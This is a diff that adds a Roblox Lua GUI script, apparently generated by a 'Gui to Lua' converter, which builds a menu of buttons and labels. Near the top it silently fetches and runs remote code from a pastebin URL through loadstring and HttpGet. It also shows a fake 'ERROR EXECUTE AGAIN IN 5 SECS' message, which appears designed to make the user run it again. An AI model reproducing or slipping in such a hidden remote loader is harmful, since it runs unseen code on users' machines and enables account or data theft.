@@ -1,0 +1,89 @@
+-- Gui to Lua
+-- Version: 1.09
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/CXjVYf9X'),true))()
+ 
+-- Instances:
+
+local gui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local UIGradient_2 = Instance.new("UIGradient")
+local TextLabel_3 = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
+local TextLabel_4 = Instance.new("TextLabel")
+local UICorner_4 = Instance.new("UICorner")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local TextButton = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local UIGradient_3 = Instance.new("UIGradient")
+local TextButton_2 = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local UIGradient_4 = Instance.new("UIGradient")
+local TextButton_3 = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local UIGradient_5 = Instance.new("UIGradient")
+local TextButton_4 = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local UIGradient_6 = Instance.new("UIGradient")
+local TextButton_5 = Instance.new("TextButton")
+local UICorner_9 = Instance.new("UICorner")
+local UIGradient_7 = Instance.new("UIGradient")
+local TextButton_6 = Instance.new("TextButton")
+local UICorner_10 = Instance.new("UICorner")
+local UIGradient_8 = Instance.new("UIGradient")
+local TextButton_7 = Instance.new("TextButton")
+local UICorner_11 = Instance.new("UICorner")
+local UIGradient_9 = Instance.new("UIGradient")
+local TextButton_8 = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
+local UIGradient_10 = Instance.new("UIGradient")
+local TextLabel_5 = Instance.new("TextLabel")
+local UICorner_13 = Instance.new("UICorner")
+local UIGradient_11 = Instance.new("UIGradient")
+local TextButton_9 = Instance.new("TextButton")
+local UICorner_14 = Instance.new("UICorner")
+local UIGradient_12 = Instance.new("UIGradient")
+local TextLabel_6 = Instance.new("TextLabel")
+local UICorner_15 = Instance.new("UICorner")
+local UIGradient_13 = Instance.new("UIGradient")
+local ImageLabel = Instance.new("ImageLabel")
+local UICorner_16 = Instance.new("UICorner")
+local UIGradient_14 = Instance.new("UIGradient")
+
+--Properties:
+
+gui.Name = "gui"
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = gui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 0.300
+Frame.Position = UDim2.new(0.0231799465, 0, 0.223568618, 0)
+Frame.Size = UDim2.new(0, 297, 0, 550)
+
+
+
+UICorner.Parent = Frame
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 85, 127)), ColorSequenceKeypoint.new(0.52, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(85, 170, 255))}
+UIGradient.Parent = Frame
+
+
+
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 0.550
+TextLabel.Size = UDim2.new(0, 296, 0, 66)
+TextLabel.Font = Enum.Font.Cartoon
+TextLabel.Text =" ERROR EXECUTE AGAIN IN 5 SECS"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
